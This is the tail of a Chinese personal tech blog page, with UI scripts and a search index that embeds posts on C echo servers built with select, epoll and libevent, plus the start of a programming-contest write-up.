  <div class="gemini back-to-top" id="back_to_top">
    <i class="fa fa-arrow-up"></i>
    
    <span class="scrollpercent">
      <span id="back_to_top_text">0</span>%
    </span>
    
  </div>
  
  
  
  <div class="bg-img">
    <img src="/media/images/background.jpg" />
  </div>
  
  
  
  
</div>
<script>

  let sideBarOpen = 'sidebar-open';
  let body = document.body;
  let back2Top = document.querySelector('#back_to_top'),
    back2TopText = document.querySelector('#back_to_top_text'),
    drawerBox = document.querySelector('#drawer_box'),
    rightSideBar = document.querySelector('.sidebar'),
    viewport = document.querySelector('body');

  function scrollAnimation(currentY, targetY) {

    let needScrollTop = targetY - currentY
    let _currentY = currentY
    setTimeout(() => {
      const dist = Math.ceil(needScrollTop / 10)
      _currentY += dist
      window.scrollTo(_currentY, currentY)
      if (needScrollTop > 10 || needScrollTop < -10) {
        scrollAnimation(_currentY, targetY)
      } else {
        window.scrollTo(_currentY, targetY)
      }
    }, 1)
  }

  back2Top.addEventListener("click", function (e) {
    scrollAnimation(document.scrollingElement.scrollTop, 0);
    e.stopPropagation();
    return false;
  });

  window.addEventListener('scroll', function (e) {
    let percent = document.scrollingElement.scrollTop / (document.scrollingElement.scrollHeight - document.scrollingElement.clientHeight) * 100;
    if (percent > 1 && !back2Top.classList.contains('back-top-active')) {
      back2Top.classList.add('back-top-active');
    }
    if (percent == 0) {
      back2Top.classList.remove('back-top-active');
    }
    if (back2TopText) {
      back2TopText.textContent = Math.floor(percent);
    }
  });


  let hasCacu = false;
  window.addEventListener('resize', function (e) {
    calcuHeight();
  });

  function calcuHeight() {
    // 动态调整站点概览高度
    if (!hasCacu && back2Top.classList.contains('pisces') || back2Top.classList.contains('gemini')) {
      let sideBar = document.querySelector('.sidebar');
      let navUl = document.querySelector('#site_nav');
      sideBar.style = 'margin-top:' + (navUl.offsetHeight + navUl.offsetTop + 15) + 'px;';
      hasCacu = true;
    }
  }
  calcuHeight();

  let open = false, MOTION_TIME = 300, RIGHT_MOVE_DIS = '320px';

  if (drawerBox) {
    let rightMotions = document.querySelectorAll('.right-motion');
    let right = drawerBox.classList.contains('right');

    let transitionDir = right ? "transition.slideRightIn" : "transition.slideLeftIn";

    let openProp, closeProp;
    if (right) {
      openProp = {
        paddingRight: RIGHT_MOVE_DIS
      };
      closeProp = {
        paddingRight: '0px'
      };
    } else {
      openProp = {
        paddingLeft: RIGHT_MOVE_DIS
      };
      closeProp = {
        paddingLeft: '0px'
      };
    }

    drawerBox.onclick = function () {
      open = !open;
      jQuery.Velocity(rightSideBar, 'stop');
      jQuery.Velocity(viewport, 'stop');
      jQuery.Velocity(rightMotions, 'stop');
      if (open) {
        jQuery.Velocity(rightSideBar, {
          width: RIGHT_MOVE_DIS
        }, {
          duration: MOTION_TIME,
          begin: function () {
            jQuery.Velocity(rightMotions, transitionDir, {});
          }
        })
        jQuery.Velocity(viewport, openProp, {
          duration: MOTION_TIME
        });
      } else {
        jQuery.Velocity(rightSideBar, {
          width: '0px'
        }, {
          duration: MOTION_TIME,
          begin: function () {
            jQuery.Velocity(rightMotions, {
              opacity: 0
            });
          }
        })
        jQuery.Velocity(viewport, closeProp, {
          duration: MOTION_TIME
        });
      }
      for (let i = 0; i < drawerBox.children.length; i++) {
        drawerBox.children[i].classList.toggle('muse-line');
      }
      drawerBox.classList.toggle(sideBarOpen);
    }
  }

  // 链接跳转
  let newWindow = 'false'
  if (newWindow === 'true') {
    let links = document.querySelectorAll('.post-body a')
    links.forEach(item => {
      if (!item.classList.contains('btn')) {
        item.setAttribute("target", "_blank");
      }
    })
  }

  let faSearch = document.querySelector('#fa_search');
  faSearch && faSearch.addEventListener('click', function () {
    document.querySelector('#search_mask').style = ''
  })

  // 代码高亮
  hljs.initHighlightingOnLoad();
  
  // 离开当前页title变化
  var leaveTitle = "";
  var normal_title = document.title;
  if (leaveTitle) {
    document.addEventListener('visibilitychange', function () {
      if (document.visibilityState == 'hidden') {
        normal_title = document.title;
        document.title = leaveTitle;
      } else {
        document.title = normal_title;
      }
    });
  }

</script>

<link rel="stylesheet" href="/media/css/jquery.fancybox.css" />
<script src="/media/js/jquery.fancybox.js"></script>

<script>
  let images = document.querySelectorAll('.section img');
  images.forEach(image => {
    var parent = image.parentElement;
    var next = image.nextElementSibling;
    parent.removeChild(image);
    var aelem = document.createElement('a');
    aelem.href = image.src;
    aelem.dataset['fancybox'] = 'images';
    aelem.dataset['rel'] = 'fancybox-button';
    aelem.classList.add('fancybox');
    aelem.appendChild(image);
    parent.insertBefore(aelem, next);
  })
</script>

    <div class="reward-mask" style="display: none;">
  <div class="reward-relative">
    <span class="close" aria-hidden="true">x</span>
    <div class="reward-body">
      <h2>感谢您的支持，我会继续努力的!</h2>
      <div class="reward-img-box">
        <div style="position: relative; width: 140px; height: 140px;">
          
          
          
        </div>
      </div>
      <p class="reward-word">扫码打赏，你说多少就多少</p>
      <p class="reward-tip">打开微信扫一扫，即可进行扫码打赏哦</p>
    </div>
    <div class="bottom">
      
      
    </div>
  </div>
</div>
<style>
  .reward-mask {
    position: fixed;
    z-index: 99999;
    top: 0;
    bottom: 0;
    left: 0;
    right: 0;
    background-color: #00000054;
  }

  .reward-relative {
    position: relative;
    width: 480px;
    text-align: center;
    margin: 0 auto;
    border-radius: 5px;
    background-color: #fff;
    top: 50%;
    margin-top: -205px;
  }

  .reward-relative .close {
    position: absolute;
    right: 10px;
    font-weight: normal;
    font-size: 16px;
    color: #929292;
  }

  .reward-body {
    padding: 40px 20px 20px;
  }

  .bottom {
    display: flex;
  }

  .reward-btn {
    text-align: center;
  }

  .reward-btn-text {
    display: inline-block;
    cursor: pointer;
    width: 60px;
    height: 60px;
    line-height: 60px;
    border-radius: 50%;
    background-color: #ff9734;
    color: #FFF;
    margin-top: 20px;
  }

  .pay-text {
    margin-top: 10px;
    padding: 10px;
    flex: 1;
    transition: all .2s linear;
  }

  .pay-text:hover {
    background-color: #a5a5a536;
  }

  .reward-body h2 {
    padding-top: 10px;
    text-align: center;
    color: #a3a3a3;
    font-size: 16px;
    font-weight: normal;
    margin: 0 0 20px;
  }

  .reward-body h2:after,
  .reward-body h2:before {
    font-family: Arial, Helvetica, sans-serif;
    background: 0 0;
    width: 0;
    height: 0;
    font-style: normal;
    color: #eee;
    font-size: 80px;
    position: absolute;
    top: 20px;
  }

  .reward-body h2:before {
    content: '\201c';
    left: 50px;
  }

  .reward-body h2:after {
    content: '\201d';
    right: 80px;
  }

  .reward-img-box {
    display: inline-block;
    padding: 10px;
    border: 6px solid #ea5f00;
    margin: 0 auto;
    border-radius: 3px;
    position: relative;
  }

  .reward-img {
    position: absolute;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
  }

  @media (max-width: 767px) {
    .reward-relative {
      height: 100%;
      top: 0px;
      margin-top: 0;
      width: auto;
    }

    .reward-relative .bottom {
      flex-direction: column;
    }

    .reward-relative .pay-text {
      width: 80%;
      margin: 5px auto;
      border: 1px solid silver;
      padding: 6px;
      border-radius: 4px;
    }

    .reward-body h2:after {
      right: 40px;
    }

    .reward-body h2:after,
    .reward-body h2:before {
      font-size: 60px;
    }

    .reward-body h2:before {
      left: 20px;
    }
  }
</style>
<script>
  !function () {
    var mask = document.querySelector('.reward-mask');
    let close = document.querySelector('.reward-relative .close');
    let rewardBtn = document.querySelector('.reward-btn');

    let zfb = document.querySelector('#zfb'),
      wx = document.querySelector('#wx'),
      zfbBtn = document.querySelector('#zfbBtn'),
      wxBtn = document.querySelector('#wxBtn');

    if (zfbBtn && wxBtn) {
      zfbBtn.addEventListener('click', () => {
        jQuery.Velocity(zfb, 'transition.slideLeftIn', {
          duration: 400
        });
        jQuery.Velocity(wx, 'transition.slideRightOut', {
          display: 'none',
          duration: 400
        });
      });

      wxBtn.addEventListener('click', () => {
        jQuery.Velocity(wx, 'transition.slideRightIn', {
          duration: 400
        });
        jQuery.Velocity(zfb, 'transition.slideLeftOut', {
          display: 'none',
          duration: 400
        });
      });
    }

    rewardBtn.addEventListener('click', (e) => {
      jQuery.Velocity(mask, 'transition.slideDownIn', {
        duration: 400
      })
    });

    close.addEventListener('click', (e) => {
      e.preventDefault();
      jQuery.Velocity(mask, 'transition.slideUpOut', {
        duration: 400
      })
    })
  }()
</script>

  </div>
</body>

<div class="search-mask" id="search_mask" style="display: none;">
  <div class="search-box">
    <div class="search-title">
      <i class="fa fa-search"></i>
      <div class="input-box">
        <input id="search" type="text" class="language" data-lan="search" placeholder="搜索">
      </div>
      <i id="close" class="fa fa-times-circle"></i>
    </div>
    <div class="stat-box">
      <span id="stat_count">0</span><span class="language" data-lan="stat">条相关条目，使用了</span><span id="stat_times">0</span><span class="language" data-lan="stat-time">毫秒</span>
      <hr>
    </div>
    <div class="result" id="result">
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://yulan.net.cn/post/about/"" data-c="
          &lt;blockquote&gt;
&lt;p&gt;欢迎来到我的小站呀，很高兴遇见你！🤝&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;关于本站&#34;&gt;🏠 关于本站&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;本站的创作内容全部来源于&lt;a href=&#34;https://www.yuque.com/yulan-updh1&#34;&gt;我的语雀知识库&lt;/a&gt;，欢迎大家访问&lt;/li&gt;
&lt;li&gt;我的创作通常会第一时间发布到语雀上，因此语雀中也会包含很多未分类的、草稿性质的文章&lt;/li&gt;
&lt;li&gt;每隔一定时间，我会将语雀上我认为优质的内容同步到本站&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;联系我呀&#34;&gt;📬 联系我呀&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;mailto:1301481108@qq.com&#34;&gt;1301481108@qq.com&lt;/a&gt;&lt;/p&gt;
">关于</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://yulan.net.cn/post/xdsvqq_rga2qz/"" data-c="
          &lt;h2 id=&#34;服务端&#34;&gt;服务端&lt;/h2&gt;
&lt;h3 id=&#34;severec&#34;&gt;severe.c&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;// severe.c

#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;event2/event.h&amp;gt;
#include &amp;lt;event2/listener.h&amp;gt;
#include &amp;lt;event2/bufferevent.h&amp;gt;
#include &amp;quot;callbacks.h&amp;quot;

int main()
{
    // 创建event base
    struct event_base* base = NULL;
    base = event_base_new();
    if(base == NULL){
        perror(&amp;quot;event base new error&amp;quot;);
        exit(1);
    }

    // 填写套接字地址
    struct sockaddr_in saddr;
    memset(&amp;amp;saddr,0, sizeof(saddr));
    saddr.sin_family = AF_INET;
    saddr.sin_port = htons(9999);
    saddr.sin_addr.s_addr = htonl(INADDR_ANY);

    // 创建listern_cb回调函数的参数
    struct CallBackArgs* args = malloc(sizeof(struct CallBackArgs));
    args-&amp;gt;base = base;

    // 申请套接字、绑定、监听
    struct evconnlistener* evl = NULL;
    evl = evconnlistener_new_bind(base,
                                  listen_cb,
                                  (void *)args,
                                  LEV_OPT_CLOSE_ON_FREE | LEV_OPT_REUSEABLE,
                                  -1,
                                  (struct sockaddr*)&amp;amp;saddr,
                                  sizeof(saddr));
    if (evl == NULL){
        perror(&amp;quot;event listener new bind error&amp;quot;);
        exit(1);
    }

    // 开始运行
    int code;
    code = event_base_dispatch(base);
    if(code == -1){
        perror(&amp;quot;event base dispatch error&amp;quot;);
        exit(1);
    }

    // 资源关闭
    evconnlistener_free(evl);
    free(args);
    event_base_free(base);
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;callbacksh&#34;&gt;callbacks.h&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;// callbacks.h

#ifndef CLIBEVENT_CALLBACKS_H
#define CLIBEVENT_CALLBACKS_H

#include &amp;lt;event2/event.h&amp;gt;
#include &amp;lt;event2/listener.h&amp;gt;
#include &amp;lt;event2/bufferevent.h&amp;gt;

/* 自定义回调参数数据结构 */
struct CallBackArgs
{
    struct event_base* base;
};

/** 监听listen回调函数
 * type: evconnlistener_cb
 * */
void listen_cb(struct evconnlistener * evl, evutil_socket_t fd, struct sockaddr * caddr,
               int socklen, void * args);

/**
   read回调函数
   type: bufferevent_data_cb
*/
void read_cb(struct bufferevent *bfev, void *args);

/**
 * write回调函数
 * type: bufferevent_data_cb
 * */
void write_cb(struct bufferevent *bfev, void *args);

/**
 * event回调函数
 * type: bufferevent_event_cb
 * */
void event_cb(struct bufferevent *bfev, short what, void *args);

#endif //CLIBEVENT_CALLBACKS_H

&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;callbacksc&#34;&gt;callbacks.c&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;// callbacks.c

#include &amp;quot;callbacks.h&amp;quot;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;ctype.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
void listen_cb(struct evconnlistener * evl, evutil_socket_t fd, struct sockaddr * caddr,
        int socklen, void * args)
{
    // 获取参数
    struct CallBackArgs* cb_args = (struct CallBackArgs*) args;

    // 创建buffer event
    struct bufferevent* bfev = NULL;
    bfev = bufferevent_socket_new(cb_args-&amp;gt;base,fd,BEV_OPT_CLOSE_ON_FREE);
    if(bfev == NULL){
        perror(&amp;quot;buffer socket new error&amp;quot;);
        return;
    }

    // 启用读写事件
    int code;
    code = bufferevent_enable(bfev,EV_READ | EV_WRITE);
    if(code == -1){
        perror(&amp;quot;buffer event enable error&amp;quot;);
        bufferevent_free(bfev);
        return;
    }

    // 注册回调函数
    bufferevent_setcb(bfev,
                      read_cb,
                      write_cb,
                      event_cb,
                      NULL);
}

void read_cb(struct bufferevent *bfev, void *args)
{
    //接收数据
    char buff[1024] = {0};
    int len = bufferevent_read(bfev,buff, sizeof(buff));
    printf(&amp;quot;接收到了数据:%s&amp;quot;,buff);

    // 处理数据
    int i;
    for(i = 0;i&amp;lt;len ;++i){
        buff[i] = toupper(buff[i]);
    }

    // 发送数据
    int code;
    code = bufferevent_write(bfev,buff, strlen(buff)+1);
    if(code == -1){
        perror(&amp;quot;buffer write error&amp;quot;);
        return;
    }
    printf(&amp;quot;我发回了数据:%s&amp;quot;,buff);
}

void write_cb(struct bufferevent *bfev, void *args)
{
    printf(&amp;quot;我的数据发送完毕\n&amp;quot;);
}

void event_cb(struct bufferevent *bfev, short what, void *args)
{
    // 出现错误，释放资源，不做额外处理
    if(args)
        free(args);
    bufferevent_free(bfev);
    printf(&amp;quot;关闭 buffer event\n&amp;quot;);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;客户端&#34;&gt;客户端&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;// 发送一次数据并受到服务器返回后就退出event循环，结束程序

#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;event2/event.h&amp;gt;
#include &amp;lt;event2/bufferevent.h&amp;gt;
#include &amp;lt;arpa/inet.h&amp;gt;

void read_cb(struct bufferevent *bfev, void *args)
{
    char buff[1024] = {0};
    int len = bufferevent_read(bfev, buff, sizeof(buff));
    printf(&amp;quot;从服务器接收到了数据:%s&amp;quot;, buff);
    bufferevent_free(bfev);
}

void write_cb(struct bufferevent *bfev, void *args)
{
    printf(&amp;quot;数据已发送&amp;quot;);
}

void event_cb(struct bufferevent *bfev, short what, void *args)
{
    if (what &amp;amp; BEV_EVENT_CONNECTED)
    {
        printf(&amp;quot;连接建立完成\n&amp;quot;);
        return;
    }

    if (what &amp;amp; BEV_EVENT_ERROR)
    {
        printf(&amp;quot;出现错误事件\n&amp;quot;);
        perror(&amp;quot;&amp;quot;);
        if (args != NULL)
            free(args);
        bufferevent_free(bfev);
        exit(1);
    }
    if (what &amp;amp; BEV_EVENT_EOF)
    {
        printf(&amp;quot;连接已断开\n&amp;quot;);
        if (args != NULL)
            free(args);
        bufferevent_free(bfev);
        exit(0);
    }
}

void std_cb(evutil_socket_t fd, short what, void *sock_bev)
{
    char buff[1024] = {0};
    int len = read(fd, buff, sizeof(buff));
    struct bufferevent *bev = (struct bufferevent *)sock_bev;
    int code;
    code = bufferevent_write(bev, buff, strlen(buff) + 1);
    if (code == -1)
    {
        perror(&amp;quot;write to buffer event error&amp;quot;);
        exit(1);
    }
}

int main()
{
    struct event_base *base = NULL;
    base = event_base_new();
    if (base == NULL)
    {
        perror(&amp;quot;base new error&amp;quot;);
        exit(1);
    }

    // 要连接的服务器信息
    struct sockaddr_in serv;
    memset(&amp;amp;serv, 0, sizeof(serv));
    serv.sin_family = AF_INET;
    serv.sin_port = htons(9999);
    inet_pton(AF_INET, &amp;quot;127.0.0.1&amp;quot;, &amp;amp;serv.sin_addr.s_addr);

    // 创建套接字
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd &amp;lt; 0)
    {
        perror(&amp;quot;create socket erroe&amp;quot;);
        exit(1);
    }
    printf(&amp;quot;套接字创建完成\n&amp;quot;);
    // 创建本次通信的bufferevent
    struct bufferevent *bev = NULL;
    bev = bufferevent_socket_new(base, fd, BEV_OPT_CLOSE_ON_FREE);

    int code;
    code = bufferevent_socket_connect(bev, (struct sockaddr *)&amp;amp;serv, sizeof(serv));
    if (code == -1)
    {
        perror(&amp;quot;connect error&amp;quot;);
        exit(1);
    }

    bufferevent_setcb(bev, read_cb, write_cb, event_cb, NULL);

    code = bufferevent_enable(bev, EV_READ | EV_WRITE);
    if (code == -1)
    {
        perror(&amp;quot;enable error&amp;quot;);
        exit(1);
    }

    // 创建std输入事件
    struct event *ev = NULL;
    ev = event_new(base, STDIN_FILENO, EV_READ, std_cb, (void *)bev);
    if (ev == NULL)
    {
        perror(&amp;quot;创建std event error&amp;quot;);
        exit(1);
    }

    code = event_add(ev, NULL);
    if (code == -1)
    {
        perror(&amp;quot;event add error&amp;quot;);
        exit(1);
    }
    // 开始运行
    code = event_base_dispatch(base);
    if (code == -1)
    {
        perror(&amp;quot;dispatch error&amp;quot;);
        exit(1);
    }
    //printf(&amp;quot;event base start\n&amp;quot;);

    event_base_free(base);
    printf(&amp;quot;event base free\n&amp;quot;);
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
">linux服务端--3. libevent实现回显服务器与客户端</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://yulan.net.cn/post/xdsvqq_xthbax/"" data-c="
          &lt;h2 id=&#34;代码&#34;&gt;代码&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;sys/socket.h&amp;gt;
#include &amp;lt;netdb.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;arpa/inet.h&amp;gt;
#include &amp;lt;netinet/in.h&amp;gt;
#include &amp;lt;errno.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;ctype.h&amp;gt;
#include &amp;lt;sys/epoll.h&amp;gt;

int main()
{
    int lfd = socket(AF_INET, SOCK_STREAM, 0);
    if (lfd == -1)
    {
        perror(&amp;quot;socket error&amp;quot;);
        exit(1);
    }

    //设置端口复用
    int opt = 1;
    setsockopt(lfd, SOL_SOCKET, SO_REUSEADDR, (const void *)&amp;amp;opt, sizeof(opt));

    struct sockaddr_in serv_addr;
    memset(&amp;amp;serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(9317);
    serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);

    int ret = bind(lfd, (struct sockaddr *)&amp;amp;serv_addr, sizeof(serv_addr));
    if (ret == -1)
    {
        perror(&amp;quot;bind error&amp;quot;);
        exit(1);
    }

    ret = listen(lfd, 64);
    if (ret == -1)
    {
        perror(&amp;quot;listen error&amp;quot;);
        exit(1);
    }

    struct sockaddr_in client_addr;
    socklen_t cli_addr_len = sizeof(struct sockaddr_in);

    //
    struct epoll_event events[2000];

    // 创建epoll实例
    int epfd = epoll_create(2000);

    //把监听事件挂到epoll红黑树上
    struct epoll_event event_l;
    event_l.events = EPOLLIN;
    event_l.data.fd = lfd;
    if ((epoll_ctl(epfd, EPOLL_CTL_ADD, lfd, &amp;amp;event_l)) &amp;lt; 0)
    {
        fprintf(stderr, &amp;quot;epoll ctl error: %s\n&amp;quot;, strerror(errno));
        exit(1);
    }

    while (1)
    {
        // 有事件发送的epoll_event结构体会复制到events上，ret为事件总数
        int ret = epoll_wait(epfd, events, sizeof(events) / sizeof(events[0]), -1);
        if (ret &amp;lt; 0)
        {
            fprintf(stderr, &amp;quot;epoll wait error: %s\n&amp;quot;, strerror(errno));
            exit(1);
        }

        int k;
        for (k = 0; k &amp;lt; ret; k++)
        {
            // 读事件
            if (events[k].events &amp;amp; EPOLLIN)
            {
                // tfd: this fd
                int tfd = events[k].data.fd;

                if (tfd == lfd)
                {
                    // 处理监听套接字的事件
                    int cfd = accept(lfd, (struct sockaddr *)&amp;amp;client_addr, &amp;amp;cli_addr_len);
                    if (cfd &amp;lt; 0)
                    {
                        fprintf(stderr, &amp;quot;accept error: %s\n&amp;quot;, strerror(errno));
                    }

                    // 把客户端fd挂到epoll红黑树上
                    struct epoll_event tmp;
                    tmp.events = EPOLLIN;
                    tmp.data.fd = cfd;
                    if ((epoll_ctl(epfd, EPOLL_CTL_ADD, cfd, &amp;amp;tmp)) &amp;lt; 0)
                    {
                        fprintf(stderr, &amp;quot;epoll ctl error: %s\n&amp;quot;, strerror(errno));
                        exit(1);
                    }
                }
                else
                {
                    // 客户端fd的事件
                    char buff[1024];
                    int rec_len, i;
                    if ((rec_len = recv(tfd, buff, sizeof(buff), 0)) &amp;lt; 0)
                    {
                        fprintf(stderr, &amp;quot;read error: %s\n&amp;quot;, strerror(errno));
                        exit(1);
                    }
                    else if (rec_len == 0)
                    {
                        // 客户端关闭连接
                        if ((epoll_ctl(epfd, EPOLL_CTL_DEL, tfd, NULL)) &amp;lt; 0)
                        {
                            fprintf(stderr, &amp;quot;epoll ctl error: %s\n&amp;quot;, strerror(errno));
                            exit(1);
                        }
                        close(tfd);
                    }
                    else
                    {
                        printf(&amp;quot;%s&amp;quot;, buff);
                        for (i = 0; i &amp;lt; rec_len; ++i)
                        {
                            buff[i] = toupper(buff[i]);
                        }
                        send(tfd, buff, rec_len, 0);
                    }
                }
            }
        }
    }
    close(epfd);
    close(lfd);
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;epoll的一点小问题&#34;&gt;epoll的一点小问题&lt;/h2&gt;
&lt;p&gt;如果某个fd被关闭，并且这次关闭是真正地释放了资源，而不是减少引用技术，那么这个fd会自动从eopll中删除，这时再调用epoll_ctl(EPOLL_CTL_DEL)可能会报错。&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;   Q6  Will closing a file descriptor cause it  to  be  removed  from  all
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code&gt;       epoll sets automatically?

   A6  Yes,  but  be aware of the following point.  A file descriptor is a
       reference to an open file description (see  [open(2)](http://man.he.net/man2/open)).   Whenever  a
       descriptor  is duplicated via [dup(2)](http://man.he.net/man2/dup), [dup2(2)](http://man.he.net/man2/dup2), [fcntl(2)](http://man.he.net/man2/fcntl) F_DUPFD, or
       [fork(2)](http://man.he.net/man2/fork), a new file descriptor referring  to  the  same  open  file
       description  is  created.   An  open  file description continues to
       exist until all file descriptors referring to it have been  closed.
       A  file  descriptor is removed from an epoll set only after all the
       file descriptors referring to the underlying open file  description
       have been closed (or before if the descriptor is explicitly removed
       using [epoll_ctl(2)](http://man.he.net/man2/epoll_ctl) EPOLL_CTL_DEL).  This means that  even  after  a
       file  descriptor  that  is  part  of  an epoll set has been closed,
       events may be reported for  that  file  descriptor  if  other  file
       descriptors  referring  to  the  same  underlying  file description
       remain open.
&lt;/code&gt;&lt;/pre&gt;
">linux服务端--2. epoll 实现回显服务器</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://yulan.net.cn/post/xdsvqq_ymoehs/"" data-c="
          &lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;sys/socket.h&amp;gt;
#include &amp;lt;netdb.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;arpa/inet.h&amp;gt;
#include &amp;lt;netinet/in.h&amp;gt;
#include &amp;lt;errno.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;ctype.h&amp;gt;
#include &amp;lt;sys/select.h&amp;gt;

int main()
{
    // 创建监听套接字
    int lfd = socket(AF_INET, SOCK_STREAM, 0);
    if (lfd == -1)
    {
        perror(&amp;quot;socket error&amp;quot;);
        exit(1);
    }

    // 设置端口复用
    int opt = 1;
    setsockopt(lfd, SOL_SOCKET, SO_REUSEADDR, (const void *)&amp;amp;opt, sizeof(opt));

    //IP地址与端口号信息
    struct sockaddr_in serv_addr;
    memset(&amp;amp;serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(9317);
    serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);

    // 绑定、监听
    int ret = bind(lfd, (struct sockaddr *)&amp;amp;serv_addr, sizeof(serv_addr));
    if (ret == -1)
    {
        perror(&amp;quot;bind error&amp;quot;);
        exit(1);
    }

    ret = listen(lfd, 64);
    if (ret == -1)
    {
        perror(&amp;quot;listen error&amp;quot;);
        exit(1);
    }

    // 用来接收客户端ip信息
    struct sockaddr_in client_addr;
    socklen_t cli_addr_len = sizeof(struct sockaddr_in);

    // select用的两个事件数组
    fd_set reads, temps;
    // 最大的事件fd
    int max_fd;
    // 初始化reads事件表
    FD_ZERO(&amp;amp;reads);
    // 设置内核监视监听套接字
    FD_SET(lfd, &amp;amp;reads);
    max_fd = lfd;

    while (1)
    {
        // 复制reads表传参，保留原reads表不变，因为select会修改传进去的表
        temps = reads;

        int ret = select(max_fd + 1, &amp;amp;temps, NULL, NULL, NULL);
        if (ret &amp;lt; 0)
        {
            fprintf(stderr, &amp;quot;select error: %s\n&amp;quot;, strerror(errno));
            exit(1);
        }

        // 监听套接字有事件
        if (FD_ISSET(lfd, &amp;amp;temps))
        {
            int cfd;
            if ((cfd = accept(lfd, (struct sockaddr *)&amp;amp;client_addr, &amp;amp;cli_addr_len)) &amp;lt; 0)
            {
                fprintf(stderr, &amp;quot;accept error: %s\n&amp;quot;, strerror(errno));
                exit(1);
            }
            // 新套接字（客户套接字）加入reads表
            FD_SET(cfd, &amp;amp;reads);
            max_fd = max_fd &amp;gt; cfd ? max_fd : cfd;
        }
        int k;
        for (k = lfd + 1; k &amp;lt;= max_fd; k++)
        {
            // 客户端有事件，处理
            if (FD_ISSET(k, &amp;amp;temps))
            {
                char buff[1024];
                int rec_len, i;
                if ((rec_len = recv(k, buff, sizeof(buff), 0)) &amp;lt; 0)
                {
                    fprintf(stderr, &amp;quot;read error: %s\n&amp;quot;, strerror(errno));
                    exit(1);
                }
                else if (rec_len == 0)
                {
                    // 客户端关闭连接
                    close(k);
                    FD_CLR(k, &amp;amp;reads);
                }
                else
                {
                    for (i = 0; i &amp;lt; rec_len; ++i)
                    {
                        buff[i] = toupper(buff[i]);
                    }
                    send(k, buff, rec_len, 0);
                }
            }
        }
    }
    close(lfd);
    return 0;
}

&lt;/code&gt;&lt;/pre&gt;
">linux服务端--1. select实现回显服务器</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://yulan.net.cn/post/sw67dr_kb5gab/"" data-c="
          &lt;h3 id=&#34;7-1-panda-and-pp-milk-20分&#34;&gt;7-1 Panda and PP Milk (20分)&lt;/h3&gt;
&lt;p&gt;这道题杀死了不少同学的心态，但是如果想到方法了就特别简单。&lt;br&gt;
简单说下做法，一共对全表进行两次扫描，第一次从左到右，第二次从右到左，每次扫描时，如果后面熊猫比前面重，则供奶量+1（以2、3、4计，最后统一乘100)如果体重持平，则保持不变，体重减轻，则供奶量恢复为2，从左向右扫描满足所有熊猫看到自己左边的熊猫都会满意，从右向左满足右边熊猫，对每个熊猫取两次扫描中的较大值，即为答案。&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;体重&lt;/th&gt;
&lt;th&gt;180&lt;/th&gt;
&lt;th&gt;160&lt;/th&gt;
&lt;th&gt;100&lt;/th&gt;
&lt;th&gt;150&lt;/th&gt;
&lt;th&gt;145&lt;/th&gt;
&lt;th&gt;142&lt;/th&gt;
&lt;th&gt;138&lt;/th&gt;
&lt;th&gt;138&lt;/th&gt;
&lt;th&gt;140&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;左向右&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;/tr&gt;
